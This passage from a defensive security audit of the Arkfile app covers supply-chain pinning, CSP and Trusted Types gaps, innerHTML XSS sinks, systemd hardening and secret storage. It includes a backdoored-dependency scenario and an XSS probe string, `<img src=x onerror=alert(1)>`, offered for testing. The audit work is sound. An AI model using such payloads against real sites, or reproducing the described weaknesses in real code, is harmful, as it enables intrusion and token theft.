  - A maintainer of `@noble/hashes` (or `zxcvbn`) account is compromised. A malicious 2.0.2 is published with a `^2.0.1`-compatible API surface but a backdoored SHA-256 implementation. The next `prod-deploy.sh` run picks it up; `dist/app.js` now contains the backdoor. F-04 (no SRI on the resulting bundle) and F-05 (no signed releases) mean operators have no way to detect this.
- Impact: Bundled-JS supply chain is not locked. Reproducibility impossible. Direct crypto-supply-chain risk via `@noble/hashes`.
- Recommendation:
  1. Change `scripts/setup/build.sh:349` to `${BUN_CMD} install --frozen-lockfile`.
  2. Change `package.json` ranges from `^` to exact pins (drop the caret).
  3. Add a CI step that fails if `bun install --frozen-lockfile` updates `bun.lock`.
  4. Add `bun audit` (or `bun outdated`) to the build script and fail on known-vulnerable transitive deps.
- Suggested tests:
  - CI: `bun install --frozen-lockfile`; `git diff --exit-code bun.lock` must pass.
  - CI: deliberate `bun.lock` tamper; build must fail.
- Cross-refs: Slice F F-04 (WASM SRI), F-25 (no `govulncheck` / `bun audit`).

---

### Finding F-14: CSP forbids `'unsafe-inline'` in `script-src` but multiple TS modules emit inline `onclick=` handlers; those handlers silently do not fire in production

- Severity: **Medium**
- Confidence: **High**
- Category: frontend / design / privacy
- Component: `client/static/js/src/auth/totp.ts`, `client/static/js/src/ui/**`, `handlers/middleware.go`
- Affected files/functions:
  - `handlers/middleware.go:359-370` — `script-src 'self' 'wasm-unsafe-eval'` (no `'unsafe-inline'`),
  - `client/static/js/src/auth/totp.ts:107` — `<button onclick="this.closest('.modal-overlay').remove(); delete window.totpLoginData;" ...>` injected via `innerHTML`,
  - `client/static/js/src/auth/totp.ts`, `totp-setup.ts`, `shares/share-list.ts`, `shares/share-access.ts`, `ui/modals.ts`, `ui/password-modal.ts`, `ui/contact-info.ts`, `ui/billing.ts`, `files/list.ts`, `files/share.ts`, `utils/password-toggle.ts` — 12 files contain `innerHTML` assignments (grep).
- Description: The Arkfile CSP is strict (`script-src 'self' 'wasm-unsafe-eval'` — no `'unsafe-inline'`, no `'unsafe-eval'`). However, several TS modules build HTML strings that include inline `onclick=` event handlers and assign them via `innerHTML`. Per the CSP spec, inline event handlers are subject to `script-src` and are blocked when `'unsafe-inline'` is absent.

  In practice this means **the handlers silently do not fire in production**. The most visible example is the "cancel" button in the TOTP-modal at `totp.ts:107`: clicking it does nothing in a CSP-enforcing browser. The modal can only be dismissed by navigating away.

  Two consequences:
  1. **UX bug today.** Real users in real browsers are unable to use these controls.
  2. **CSP-loosening pressure.** When a developer notices the broken UX and "fixes" it by relaxing CSP to `'unsafe-inline'`, the entire script-src defense collapses — XSS sinks (F-17) now have a direct landing zone.

  This finding lives at the intersection of frontend correctness and security policy. Treating it as security-relevant is justified by the second consequence: the natural fix path *weakens* the CSP, which is the only defense against XSS that the application has today.

- Evidence:
  ```ts
  // client/static/js/src/auth/totp.ts:107 (from grep)
  <button onclick="this.closest('.modal-overlay').remove(); delete window.totpLoginData;" style="...">
  ```
  ```
  // handlers/middleware.go:359-360
  csp := "default-src 'self'; " +
      "script-src 'self' 'wasm-unsafe-eval'; " +
  ```
- Attack scenario:
  - Not directly exploitable. The risk is the pressure to add `'unsafe-inline'` to `script-src`, which would enable XSS-to-token-exfiltration via the localStorage path (F-07).
- Impact: UX brokenness today; CSP-weakening risk tomorrow.
- Recommendation:
  1. Refactor every `<element onclick="...">` in `client/static/js/src/**` to attach the listener via `el.addEventListener('click', handler)` after the element is inserted. This is mechanically straightforward; the build step (Bun) does not care.
  2. Keep CSP `script-src 'self' 'wasm-unsafe-eval'`. Do not relax to `'unsafe-inline'`.
  3. Combine with F-17 (Trusted Types) to gate every `innerHTML` write through a single sanitizer / DOM-builder helper.
- Suggested tests:
  - Browser e2e (Playwright): click every `<button onclick=...>` in every modal; assert the expected side effect occurs. Today these tests should fail; after the refactor they should pass.
  - Static-analysis: grep `client/static/js/src/**` for `onclick=` / `onchange=` / `onmouseover=` patterns; fail CI on any match.
- Cross-refs: Slice F F-07, F-08, F-17 (Trusted Types).

---

### Finding F-15: `style-src 'unsafe-inline'` accommodates a single `<style>` block in `shared.html`

- Severity: **Low**
- Confidence: **High**
- Category: frontend / design
- Component: `handlers/middleware.go`, `client/static/shared.html`
- Affected files/functions:
  - `handlers/middleware.go:361` — `style-src 'self' 'unsafe-inline'`,
  - `client/static/shared.html:8-40` — a 32-line inline `<style>` block.
- Description: CSP allows inline styles, mostly to accommodate the inline `<style>` block in `shared.html` (used for the anonymous-recipient share-receive page). Inline `style-src` is a much smaller risk than inline `script-src` — the worst a stored-XSS-via-CSS payload can do is exfiltrate by `background-image: url(...)` against `img-src` (`'self' data:`) which is also restricted. Still, every relaxation of CSP is a defense-in-depth weakening.

  The fix is mechanical: move the inline styles into `/css/shared.css` and serve it as a same-origin stylesheet.

- Evidence:
  ```
  // handlers/middleware.go:361
  "style-src 'self' 'unsafe-inline'; " +
  ```
  ```html
  <!-- client/static/shared.html:8-40 -->
  <style>
      .card { ... }
      .card h2, .card h3, .card label, .card strong { ... }
      ...
  </style>
  ```
- Recommendation: Move the `<style>` block to `/css/shared.css`. Tighten CSP to `style-src 'self'`. No code logic change is required.
- Cross-refs: Slice F F-14 (script-src parity), F-17 (Trusted Types).

---

### Finding F-16: No `Permissions-Policy` header

- Severity: **Low**
- Confidence: **High**
- Category: frontend / defense-in-depth
- Component: `handlers/middleware.go`
- Affected files/functions: `handlers/middleware.go:372-378` — header set is CSP / XCTO / XFO / XSSP / Referrer-Policy only.
- Description: `Permissions-Policy` (formerly `Feature-Policy`) lets the server disable browser features that the application does not need: `camera`, `microphone`, `geolocation`, `payment`, `usb`, `serial`, `bluetooth`, `magnetometer`, `gyroscope`, `accelerometer`, `ambient-light-sensor`, `autoplay`, `display-capture`, `fullscreen`, `picture-in-picture`, `sync-xhr`, etc. None of these are used by Arkfile.

  A header `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=(), accelerometer=(), gyroscope=(), magnetometer=(), ambient-light-sensor=(), display-capture=(), midi=(), encrypted-media=(), sync-xhr=()` denies them all. In the presence of XSS (F-07), this prevents an attacker from also using the user's camera / mic / geolocation as a side channel.

- Recommendation: add a one-line header to `CSPMiddleware`:
  ```go
  c.Response().Header().Set("Permissions-Policy",
      "camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=(), accelerometer=(), gyroscope=(), magnetometer=(), ambient-light-sensor=(), display-capture=(), midi=(), encrypted-media=(), sync-xhr=()")
  ```
- Cross-refs: Slice F F-17 (Trusted Types — same site for adding a header).

---

### Finding F-17: No `require-trusted-types-for 'script'`; ~12 `innerHTML` sinks across `client/static/js/src/**`

- Severity: **Medium**
- Confidence: **High**
- Category: frontend / XSS / design
- Component: `handlers/middleware.go`, `client/static/js/src/**`
- Affected files/functions:
  - `handlers/middleware.go:359-370` — CSP has no `require-trusted-types-for` directive,
  - 12 TS files with `innerHTML` writes (grep): `shares/share-access.ts`, `shares/share-list.ts`, `auth/totp.ts`, `auth/totp-setup.ts`, `ui/modals.ts`, `ui/password-modal.ts`, `ui/contact-info.ts`, `ui/messages.ts`, `ui/billing.ts`, `files/list.ts`, `files/share.ts`, `utils/password-toggle.ts`.
- Description: Trusted Types is a Chrome-and-Firefox-supported CSP mechanism that turns every `innerHTML = ...` (and `document.write`, `eval`, `setTimeout(string)`, etc.) into a runtime type error unless the value is wrapped in a `TrustedHTML` object produced by a registered policy. It is the modern, type-system-enforced answer to XSS.

  Arkfile's CSP does not enable Trusted Types. Every one of the 12 `innerHTML` sinks is a potential XSS landing zone if any untrusted data ever reaches the right-hand side of `el.innerHTML =`. Today, most of them concatenate static strings + locally-derived values, but some interpolate server-fetched data:

  - `shares/share-list.ts` — share metadata (owner-controlled `revoked_reason` per Slice D D-04; recipient-controlled strings if any in the future),
  - `shares/share-access.ts` — anonymous-recipient flow; envelopes are encrypted but error messages flow through here,
  - `ui/contact-info.ts` — user-controlled contact-info display (Slice E E-15, E-18 — admin-readable),
  - `files/list.ts` — file listing, including any storage-info strings (Slice C, Slice E),
  - `files/share.ts` — share creation modal; share password is *typed* here.

  Slice D D-14 already raised obvious template-literal XSS sinks in the share UI. This finding is the broader Trusted Types coverage.

- Evidence:
  ```
  # grep -rln 'innerHTML' client/static/js/src/
  client/static/js/src/shares/share-access.ts
  client/static/js/src/shares/share-list.ts
  client/static/js/src/auth/totp.ts
  client/static/js/src/auth/totp-setup.ts
  client/static/js/src/ui/modals.ts
  client/static/js/src/ui/password-modal.ts
  client/static/js/src/ui/contact-info.ts
  client/static/js/src/ui/messages.ts
  client/static/js/src/ui/billing.ts
  client/static/js/src/files/list.ts
  client/static/js/src/files/share.ts
  client/static/js/src/utils/password-toggle.ts
  ```
- Recommendation:
  1. Add `require-trusted-types-for 'script'; trusted-types arkfile-default;` to the CSP.
  2. Register a single `arkfile-default` policy in a module that all `innerHTML` sites import:
     ```ts
     // utils/trusted-types.ts
     export const sanitize = (window as any).trustedTypes?.createPolicy('arkfile-default', {
         createHTML: (s: string) => DOMPurify.sanitize(s, { /* ... */ }),
     });
     ```
  3. Refactor every `innerHTML = ...` to `el.innerHTML = sanitize.createHTML(...)`. This makes every XSS sink visible in code review.
  4. Better: replace `innerHTML` writes with DOM-builder helpers (`document.createElement` + `textContent`) wherever the markup is structural. Reserve sanitize-and-trust only for genuinely-HTML content.
- Suggested tests:
  - Browser e2e: inject a string `<img src=x onerror=alert(1)>` into every source path (filename, share message, contact-info, etc.); assert no script execution.
  - Static-analysis: ban `.innerHTML =` outside the sanitize wrapper via a lint rule.
- Cross-refs: Slice D D-14, Slice F F-07 (XSS exfiltrates tokens), F-14 (inline-handler removal goes hand in hand).

---

### Finding F-18: `tls_insecure_skip_verify` on Caddy → Arkfile upstream

- Severity: **Low**
- Confidence: **High**
- Category: operational / design
- Component: `Caddyfile`, `Caddyfile.local`, `Caddyfile.test`, `Caddyfile.prod`
- Affected files/functions: `Caddyfile.prod:30`, `Caddyfile.local:21`, `Caddyfile.test:73` (and `Caddyfile`).
- Description: All four Caddyfile variants reverse-proxy to the local Arkfile process over HTTPS-on-localhost-with-self-signed-cert, and use `tls_insecure_skip_verify` to skip cert validation on that hop. Acceptable today because:
  - The upstream is `localhost:8443` (loopback only — not reachable off-host).
  - The certificate is generated by `scripts/setup/04-setup-tls-certs.sh` as a self-signed cert that the Arkfile process owns.
  - Caddy and Arkfile run on the same host under the same operator.

  Concerns are forward-looking:
  - If the operator ever wants to move Arkfile and Caddy to separate hosts (e.g. a hardened Caddy in DMZ + Arkfile in a private network), the `tls_insecure_skip_verify` flag carries over unchanged and the security gain of the hardening move is wiped out.
  - There is no audit log of certificate changes on the upstream.

- Recommendation: Document explicitly in the Caddyfile that the flag is conditional on co-location of Caddy and Arkfile on the same loopback. If they are ever separated, replace with a pinned upstream CA (`tls_trust_pool { inline_ca <PEM> }`).
- Cross-refs: Slice F F-23 (companion informational).

---

### Finding F-19: `scripts/maintenance/rotate-jwt-keys.sh` manages a path that is no longer authoritative

- Severity: **Low** (greenfield cleanup)
- Confidence: **Medium**
- Category: design / operational / technical-debt
- Component: `scripts/maintenance/rotate-jwt-keys.sh`
- Affected files/functions:
  - `scripts/maintenance/rotate-jwt-keys.sh:19-25` — `KEY_DIR="$ARKFILE_HOME/etc/keys/jwt/current"`,
  - cross-ref Slice A's finding that JWT signing keys are now managed via `crypto.KeyManager` in the database, not on disk.
- Description: The maintenance script manages files in `/opt/arkfile/etc/keys/jwt/current/` and `/opt/arkfile/backups/jwt-rotation/`. Per Slice A, JWT signing keys are now sourced from the database via `KeyManager` and the on-disk path is no longer authoritative. The script is a leftover from an earlier design and risks confusing operators into thinking they have rotated keys when they have not.

  Per `AGENTS.md` "Greenfield" section: deprecated / "backwards compatibility" code should be flagged for removal, not accommodation. This is exactly that case.

- Recommendation:
  1. Confirm with Slice A's owner that the on-disk path is fully retired.
  2. Either delete `scripts/maintenance/rotate-jwt-keys.sh` outright or rewrite it to call a new `arkfile-admin keys rotate-jwt` subcommand that operates against the KeyManager API.
  3. Audit `scripts/maintenance/**` more broadly for other stale assumptions.
- Cross-refs: Slice A's JWT-keys-in-DB finding.

---

### Finding F-20: `/healthz` and `/readyz` publicly reachable via Caddy

- Severity: **Informational**
- Confidence: **High**
- Category: operational / privacy / defense-in-depth
- Component: `main.go`, `Caddyfile.prod`
- Affected files/functions:
  - `main.go:30-65` — both endpoints registered at the root, no middleware,
  - `Caddyfile.prod:32` — Caddy's own `health_uri /readyz` proxies through.
- Description: `/healthz` returns `{"status":"alive"}` — trivial. `/readyz` reports rqlite + storage status to *anyone* on the internet, including the wording of any error (`fmt.Sprintf("not ready: %v", err)`). Slice E E-22 (cross-ref) already raised this for the admin-side variant; this entry is the public-listener manifestation.

  Risks:
  - Driver-specific error wording (`rqlite: not ready: dial tcp 127.0.0.1:4001: connect: connection refused`) reveals the backend topology to anyone probing.
  - DoS amplification: `/readyz` is cheap but unauthenticated; trivial flood vector.

- Recommendation: Move `/healthz` and `/readyz` to a separate listener bound to loopback (or to a dedicated `/internal/` path protected by a fixed token in the Caddy → upstream hop). Keep Caddy's own `health_uri` polling against the loopback listener. The public surface should not expose readiness details.
- Cross-refs: Slice E E-16, E-22.

---

### Finding F-21: `shared-init.js` uses `innerHTML` for error rendering

- Severity: **Informational**
- Confidence: **High**
- Category: frontend / future-XSS risk
- Component: `client/static/js/shared-init.js`
- Affected files/functions: `client/static/js/shared-init.js:~10` (small non-module bootstrap script).
- Description: `shared-init.js` runs on `shared.html` before the main bundle loads, and renders error strings via `innerHTML`. Today the strings are hardcoded; the risk is a future refactor introducing interpolated values. Flagged for the Trusted Types migration (F-17) to also cover this file.
- Recommendation: same as F-17.

---

### Finding F-22: Production bundle ships with external sourcemap (`dist/app.js.map`)

- Severity: **Informational**
- Confidence: **High**
- Category: information disclosure
- Component: `client/static/js/package.json`, `scripts/setup/build.sh`
- Affected files/functions:
  - `client/static/js/package.json:23` — `"build:prod": "bun build src/app.ts --outdir dist --target browser --format iife --minify --sourcemap=external ..."`,
  - `scripts/setup/build.sh:493` — explicitly copies `app.js.map` into the build output directory.
- Description: `build:prod` emits an external sourcemap. The deploy step copies `app.js.map` into the served `dist/` directory. Anyone can fetch `https://example.com/js/dist/app.js.map` and recover the full TypeScript source, including:

  - Variable names that the minifier would otherwise obfuscate.
  - File structure under `client/static/js/src/**`.
  - Comments left in the source.

  Not a vulnerability in itself — the source is open-source under AGPLv3. But for a per-deployment install with operator-specific tweaks, or for any operator who has local patches not yet pushed upstream, this is an info leak. Also useful to attackers for understanding the structure of the client.

- Recommendation:
  1. Switch the production build to `--sourcemap=none` (or do not copy the `.map` file into the served bundle). Keep sourcemaps in the build directory for debugging, but do not deploy them.
  2. Alternatively, gate the sourcemap behind admin auth or a separate path.
- Cross-refs: Slice F F-04 (SRI), F-05 (release reproducibility).

---

### Finding F-23: `tls_insecure_skip_verify` on Caddy upstream documented as intentional (companion to F-18)

- Severity: **Informational**
- Confidence: **High**
- Category: design
- Component: same as F-18.
- Description: Companion to F-18. Recorded separately so the eventual "Caddy and Arkfile on different hosts" hardening request has a paper-trail entry.

---

### Finding F-24: deSEC API token stored on disk in plaintext (`/var/lib/caddy/caddy-env`)

- Severity: **Informational**
- Confidence: **High**
- Category: operational / secret-handling
- Component: `scripts/prod-deploy.sh`, `systemd/caddy.service`
- Affected files/functions:
  - `scripts/prod-deploy.sh:548-552` — writes `/var/lib/caddy/caddy-env` with `DESEC_TOKEN=...`, then `chmod 600`, `chown caddy:caddy`,
  - `systemd/caddy.service:14` — `EnvironmentFile=/var/lib/caddy/caddy-env`.
- Description: The deSEC DNS-01 challenge token is a long-lived bearer credential against the operator's DNS provider. It is stored in plaintext on disk, mode 0600, owned by `caddy:caddy`. Acceptable for now — file modes are correct, the path is on a dedicated user — but flagged for future at-rest encryption design (e.g. systemd Credentials with `LoadCredentialEncrypted=`).
- Recommendation:
  1. Migrate to systemd `LoadCredentialEncrypted=desec_token:/var/lib/caddy/caddy-env.cred` with `systemd-creds encrypt`. The token is then decryptable only at unit start, by the unit itself.
  2. Audit any backup tooling that includes `/var/lib/caddy/` to ensure the token does not leak via backups.
- Cross-refs: Slice F F-09 (no `LimitCORE=0` — a Caddy coredump would also contain the token in memory).

---

### Finding F-25: No `govulncheck`, `npm audit` / `bun audit`, or SBOM in the build script

- Severity: **Informational**
- Confidence: **High**
- Category: supply-chain / hardening
- Component: `scripts/setup/build.sh`
- Affected files/functions: `scripts/setup/build.sh` (entire — no `govulncheck`, no `audit`, no `syft`, no SBOM emission).
- Description: The build script does not run any automated CVE check against Go modules or npm packages. There is also no SBOM generation. This is a hardening recommendation rather than a vulnerability; the failure mode is "an attacker found a CVE in a transitive dep and we didn't notice".
- Recommendation:
  1. Add `govulncheck ./...` to `build.sh` after `go mod download`. Fail the build on any high-severity finding.
  2. Add `bun audit` (or equivalent) after `bun install --frozen-lockfile`. Fail on high-severity findings.
  3. Generate an SBOM (`syft packages dir:.` for the whole tree, plus `syft scan ./build/bin/arkfile` per binary) and ship it alongside releases.
- Cross-refs: Slice F F-05 (reproducible builds), F-13 (Bun pinning).

---

### Finding F-26: Bun lockfile is text-format `bun.lock` (informational positive)

- Severity: **Informational**
- Confidence: **High**
- Category: supply-chain (positive observation)
- Component: `client/static/js/bun.lock`
- Affected files/functions: `client/static/js/bun.lock` (text format, ~1.9 KB, committed).
- Description: The Bun lockfile is the modern text-format `bun.lock` (not the legacy binary `bun.lockb`). This makes diffs reviewable in code review and CI — a clear win for supply-chain auditability. Recorded for completeness so Slice G's synthesis acknowledges what is already done well.
- Recommendation: keep using `bun.lock`; do not regress to `bun.lockb`. Combine with `--frozen-lockfile` (F-13) for full effect.

---

## 3. Tables

### 3.1 HTTP Security Headers per environment

`set` = explicitly written by the named source; `omit` = not set; `note` = condition described. CSP is identical across all environments because it is emitted exclusively by `handlers.CSPMiddleware` (Go) — the Caddyfiles deliberately do not set CSP to avoid duplicate-CSP intersection (which would break `data:` image URIs for TOTP QR codes per the comments in each Caddyfile).

| Header | Caddyfile.local | Caddyfile.test | Caddyfile.prod | Go middleware (CSPMiddleware) | Go middleware (SecureWithConfig) | Notes |
|---|---|---|---|---|---|---|
| `Strict-Transport-Security` | set (`max-age=31536000; includeSubDomains`) | set (`max-age=63072000; includeSubDomains; preload`) | set (`max-age=63072000; includeSubDomains; preload`) | omit | set (`max-age=63072000; includeSubDomains; preload`) | duplicate between Caddy and Go in test/prod; intersection rule means both must agree on max-age |
| `Content-Security-Policy` | omit (note: deliberate) | omit | omit | **set** (full policy) | omit | F-14, F-15, F-17 |
| `X-Frame-Options` | omit | omit | omit | set (`DENY`) | set (`SAMEORIGIN`) | Go middleware order means `CSPMiddleware` runs **after** `SecureWithConfig`, so the final header is `DENY`. Should consolidate. |
| `X-Content-Type-Options` | omit | omit | omit | set (`nosniff`) | set (`nosniff`) | OK |
| `X-XSS-Protection` | omit | omit | omit | set (`1; mode=block`) | set (`1; mode=block`) | Deprecated header but harmless |
| `Referrer-Policy` | omit | omit | omit | set (`strict-origin-when-cross-origin`) | omit | OK |
| `Permissions-Policy` | omit | omit | omit | **omit** | omit | **F-16** |
| `Cross-Origin-Opener-Policy` | omit | omit | omit | omit | omit | hardening gap |
| `Cross-Origin-Embedder-Policy` | omit | omit | omit | omit | omit | hardening gap |
| `Cross-Origin-Resource-Policy` | omit | omit | omit | omit | omit | hardening gap |
| `Trusted-Types` (via CSP `require-trusted-types-for`) | omit | omit | omit | **omit** | omit | **F-17** |
| `X-Forwarded-For` handling | append (no strip) | append (no strip) | append (no strip) | trusted as-is by `c.RealIP()` | trusted | **F-01** |
| CORS allow-list | (passed by Go middleware only) | (Go) | (Go) | configured via `cfg.Server.AllowedOrigins` | — | `AllowCredentials: true` (`main.go:278`); confirm AllowedOrigins in deployed config (Open Question §5) |

### 3.2 systemd Hardening per unit

`y` = directive present with the expected value; `n` = absent; `partial` = present but incomplete. "Gap" column flags where the unit is weaker than a fully-hardened modern profile.

| Directive | arkfile | caddy | rqlite | seaweedfs | Gap notes |
|---|---|---|---|---|---|
| `User=` non-root | y (`arkfile`) | y (`caddy`) | y (`arkfile`) | y (`arkfile`) | OK |
| `NoNewPrivileges=yes` | y | y | y | y | OK |
| `ProtectSystem=strict` | y | y | partial (`full`) | partial (`full`) | rqlite + seaweedfs use `full` not `strict` |
| `ReadWritePaths=` whitelist | y | y | n | n | rqlite + seaweedfs implicitly writable everywhere not protected |
| `ProtectHome=yes` | y | y | y | y | OK |
| `PrivateTmp=yes` | y | y | y | y | OK |
| `PrivateDevices=yes` | y | y | y | **n** | F-09 (seaweedfs) |
| `ProtectKernelTunables=yes` | y | y | y | y | OK |
| `ProtectKernelModules=yes` | y | y | y | y | OK |
| `ProtectControlGroups=yes` | y | y | y | y | OK |
| `SystemCallFilter=@system-service` | y | y | **n** | **n** | F-09 |
| `LimitCORE=0` | **n** | **n** | **n** | **n** | **F-09 highest-impact gap** |
| `MemoryDenyWriteExecute=yes` | n | n | n | n | F-09 |
| `LockPersonality=yes` | n | n | n | n | F-09 |
| `RestrictAddressFamilies=` | n | n | n | n | F-09 |
| `RestrictNamespaces=yes` | n | n | n | n | F-09 |
| `RestrictSUIDSGID=yes` | n | n | n | n | F-09 |
| `ProtectClock=yes` | n | n | n | n | F-09 |
| `ProtectHostname=yes` | n | n | n | n | F-09 |
| `ProtectProc=invisible` / `ProcSubset=pid` | n | n | n | n | F-09 |
| `CapabilityBoundingSet=` empty | n | partial (has `AmbientCapabilities=CAP_NET_BIND_SERVICE`) | n | n | F-09 |
| `UMask=0077` | n | n | n | n | F-09 |
| `IPAddressDeny=any` (with allow-list) | n | n | n | n | F-09 |
| bind addr loopback-only | (Echo binds all IPs by default; gated by firewall) | (intentionally :80/:443) | **`0.0.0.0:4001` / `0.0.0.0:4002`** | y (`-ip=127.0.0.1 -ip.bind=127.0.0.1 -s3.ip.bind=127.0.0.1`) | **F-10 (rqlite)** |
| `EnvironmentFile=` mode | 0640 (`secrets.env` per `prod-deploy.sh:157`) | 0600 (`caddy-env` per `prod-deploy.sh:552`) | 0640 (shares `secrets.env`) | 0640 (shares `secrets.env`) | OK; verify at runtime per §5 |
| `Restart=` policy | always | always | on-failure | on-failure | OK |
| `StartLimitBurst=` set | y (`3`) | y (`3`) | n | n | minor consistency gap |

### 3.3 Supply chain inventory

| Component | Pinning mechanism | State | Verified by | Finding |
|---|---|---|---|---|
| Go modules (~50 direct, ~150 transitive) | `go.sum` + module proxy | Pinned by hash | `go mod verify` (manual) | OK; F-25 (no `govulncheck`) |
| libopaque (vendored C) | `.gitmodules` commit `6e9ac92` | Pinned | git submodule | OK |
| liboprf (vendored C) | `.gitmodules` commit `a8c0410` | Pinned | git submodule | OK |
| libsodium | host `pkg-config --libs --static libsodium` | **Unpinned (host package)** | — | **F-06** |
| libopaque.js (WASM) | checked-in artifact, no hash | Built at build-time; ships in repo | — | **F-04** |
| dist/app.js (TS bundle) | built from `client/static/js/src/**` | Built at build-time; ships in deployed `dist/` | — | F-04 (no SRI), F-22 (sourcemap exposed) |
| npm deps (`@noble/hashes`, `zxcvbn`, dev: `bun-types`, `typescript`, `@types/zxcvbn`) | `package.json` `^` ranges + `bun.lock` | Lockfile present, but `bun install` without `--frozen-lockfile` | — | **F-13** |
| Bun runtime itself | `command -v bun` against host install | Unpinned | — | minor (build tool only) |
| SeaweedFS release | `dependency-hashes.json` SeaweedFS 4.18 by `md5_url` | Pinned to version 4.18 but verified via **MD5** | `scripts/setup/05-setup-seaweedfs.sh` | **F-11** |
| rqlite | "built from source", no commit pin | **Unpinned** | — | **F-12** |
| Caddy binary | downloaded by `scripts/prod-deploy.sh`, no recorded hash | Unpinned (TBD — depth-of-script-read deferred) | — | follow-up; same class as F-11/F-12 |
| TLS upstream cert (Caddy→Arkfile) | self-signed by `04-setup-tls-certs.sh` | Pinned by `tls_insecure_skip_verify` ⇒ no verification | — | F-18 |
| deSEC API token | `/var/lib/caddy/caddy-env` 0600 | Plaintext on disk | — | F-24 |
| Release-artifact signing (cosign / minisign / sigstore) | — | **None** | — | F-05 |
| SBOM | — | **None** | — | F-25 |
| Reproducible builds | — | **Not reproducible** (F-05 + F-06 + F-12 + F-13) | — | F-05 (umbrella) |

### 3.4 Frontend secret-adjacent storage matrix

`Lifetime` = how long the value lives in storage; `Same-origin JS reach` = whether unrelated same-origin scripts (XSS, deps, extensions) can read it; `Cross-ref` = where else this is analyzed.

| Storage | Key / Symbol | Contents | Lifetime | Same-origin JS reach | Cross-ref |
|---|---|---|---|---|---|
| `localStorage` | `token` | full JWT | ~30 min (until refresh) | **yes** (read freely) | **F-07**, A-05 |
| `localStorage` | `refresh_token` | refresh token | configured TTL, hours-to-days | **yes** | **F-07**, A-05 |
| `sessionStorage` | OPAQUE login client-secret | OPAQUE protocol state between login steps | one round-trip (~1 s) | yes | Slice A |
| `sessionStorage` | OPAQUE register client-secret | OPAQUE protocol state between register steps | one round-trip | yes | Slice A |
| `window` global | `window.totpLoginData` | `{ tempToken, username, password, sessionKey, ... }` | login-finalize → TOTP-verify (~seconds) | **yes** | **F-08**, A-04 |
| `window` global | `window.totpLoginData.password` | plaintext password | same as above; scrubbed after TOTP-verify completes | **yes** | **F-08** |
| in-memory `Uint8Array` | account-KEK after Argon2id | derived encryption key | until next file op (then in best-effort scrubbing) | yes (until GC) | Slice B, B-23 |
| in-memory `Uint8Array` | per-file FEK | file-encryption key | per-file op | yes (until GC) | Slice B, Slice C C-19 |
| `cookies` | (none for auth) | — | — | — | intentional design choice (per code comments); reverse of `idsrp.md` §9 recommendation |
| IndexedDB | (none currently) | — | — | — | Slice C noted no IndexedDB usage |
| Service Worker cache | (none currently) | — | — | — | `sw-download.js` does not cache; only intercepts |

### 3.5 CLI / server binary build-flag inventory

Per `idsrp.md` §22.1. All three binaries are built from a single helper function (`build_go_binaries_static` in `scripts/setup/build.sh:402-433`) with identical flags.

| Flag | `arkfile` | `arkfile-client` | `arkfile-admin` | Today | Recommended | Finding |
|---|---|---|---|---|---|---|
| `CGO_ENABLED` | y | y | y | `1` | `1` (unchanged) | OK |
| `CGO_CFLAGS` (vendored libopaque/liboprf includes) | y | y | y | `-I./vendor/stef/libopaque/src -I./vendor/stef/liboprf/src` | unchanged | OK |
| `CGO_LDFLAGS` libsodium | host static | host static | host static | `$(pkg-config --libs --static libsodium)` | vendored submodule | **F-06** |
| `-ldflags '-extldflags "-static"'` | y | y | y | set | keep | OK |
| `-ldflags '-s -w'` (strip) | **n** | **n** | **n** | absent | add | **F-05** |
| `-trimpath` | **n** | **n** | **n** | absent | add | **F-05** |
| `-buildid=` (empty for determinism) | **n** | **n** | **n** | absent | add | **F-05** |
| `-buildvcs=false` | **n** | **n** | **n** | absent | add | **F-05** |
| `-a` (force rebuild) | y | y | y | set | drop (defeats caching) | F-05 |
| Static linking verified via `ldd`/`file` | y | y | y | set in `verify_static_binaries` | unchanged | OK |
| RPATH / RUNPATH stripped | (implicit from `-static`) | implicit | implicit | n/a for static | n/a | OK |
| `SOURCE_DATE_EPOCH` set | n | n | n | absent | set from git commit time | F-05 |
| Release signing | n | n | n | none | cosign / minisign | **F-05** |
| Reproducibility verified in CI | n | n | n | not run | run | **F-05** |
| Embedded WASM (for `libopaque.js`) | n/a | n/a | n/a | served as separate artifact | hash-pinned | F-04 |
| `govulncheck` in build | n | n | n | absent | add | F-25 |

---

## 4. N/A items

Items the `idsrp.md` prompt asks about that do not exist in Arkfile's frontend / supply-chain / ops surface, or are explicitly out of scope for this slice.

| Item from `idsrp.md` | Slice F status | Justification |
|---|---|---|
| Reflected XSS via routes/query params (§12) | N/A | The Go app does not render query parameters into HTML; the entire SPA is a single `index.html` and the routing happens client-side. Confirmed via `handlers/handlers.go` template inspection (no server-side templating). |
| Unsafe markdown rendering (§12) | N/A | No markdown rendering anywhere in `client/static/js/src/**` (grep). |
| Unsafe file preview rendering (§12) | N/A | No file previews. Per `00-plan.md` §6, files are encrypted blobs and never previewed server- or client-side. |
| SVG handling (§12) | N/A | No SVG upload/serve path. The favicon is a `.ico`. |
| PDF preview risks (§12) | N/A | No PDF preview. |
| Image metadata (EXIF) risks (§12) | N/A | Images are encrypted blobs; the browser never decodes them as images. |
| Stored XSS through filenames (§12) | **N/A at storage** — filenames are encrypted at rest (per Slice B). However, **decrypted** filenames are rendered into the file list (F-17 sinks); see F-17. | partial |
| Stored XSS through folder names (§12) | N/A | Flat per-user file space, no folders (per `00-plan.md` §6). |
| Stored XSS through user display names (§12) | N/A | No display names — username is the only identifier. |
| Source-map exposure (§12) | **Confirmed** (F-22) | — |
| CDN cache poisoning for private content | N/A (no CDN deployed today; Caddy serves direct) | Hardening note: if a CDN is ever added, F-04 hash-pinning becomes essential. |
| Container images (§13) | N/A | Arkfile does not ship a Docker / Podman image today. `docs/wip/podman.md` is WIP and outside Slice F scope. |
| Postinstall scripts in npm deps | N/A in `package.json` | The four `devDependencies` and two `dependencies` do not declare `postinstall`. Reverify if deps are added. |
| Build-time code generation risks (§13) | N/A | No `go:generate`, no `protoc`, no `tygo` codegen in the build pipeline. |
| Docker images running as root | N/A | No Docker image. |
| Vulnerability scanning (`Trivy`, etc.) (§13) | None present — F-25 | — |
| Service Worker scope and cache poisoning | partial N/A | `sw-download.js` (built from `src/sw-download.ts`) intercepts only same-origin `/sw-download/<uuid>` URLs and forwards already-decrypted byte streams; it does not cache. Listed in `00-plan.md` §6 (mobile constraints); detailed audit deferred to Slice G for streaming-download model. No finding here. |
